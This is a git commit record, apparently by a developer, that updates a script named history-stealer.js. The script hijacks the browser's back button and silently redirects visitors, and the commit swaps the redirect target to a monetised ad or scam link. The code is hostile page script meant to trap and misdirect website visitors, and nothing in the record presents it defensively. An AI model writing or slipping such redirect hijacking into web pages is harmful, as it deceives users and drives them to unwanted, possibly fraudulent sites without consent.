ed98e270033f37423432fb50095ba716feedcb46
darylfarahi <daryl30011996@gmail.com>
2021-12-28 00:43:27 +0700

    Update history-stealer.js

--- history-stealer.js
+++ history-stealer.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://budidaya-ikan-mudah.blogspot.com");
+      location.replace("https://scammereating.com/adbt67z2za?key=ea25217dd62b1bc22fff588efd89bb7a");
     },0);
   }
 }, false);
